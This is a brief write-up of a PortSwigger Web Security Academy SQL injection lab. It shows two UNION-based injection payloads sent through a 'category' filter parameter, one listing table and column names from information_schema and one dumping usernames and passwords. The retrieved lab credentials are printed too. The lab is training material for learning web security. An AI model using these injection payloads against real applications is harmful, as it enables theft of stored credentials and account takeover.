# Lab

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

## Payload

```sql
/filter?category=Gifts' UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns --
```

### Results

```
users_jzksxl, password_qmsqwk
users_jzksxl, username_haoeyz
```

```sql
/filter?category=Gifts' UNION SELECT username_haoeyz, password_qmsqwk FROM users_jzksxl --
```

### Results

```
administrator, dvu67pk4ih6oeje4npni
carlos, oxalz77c03az7iwz874g
wiener, fsonrxzkk264vrcuel4h
```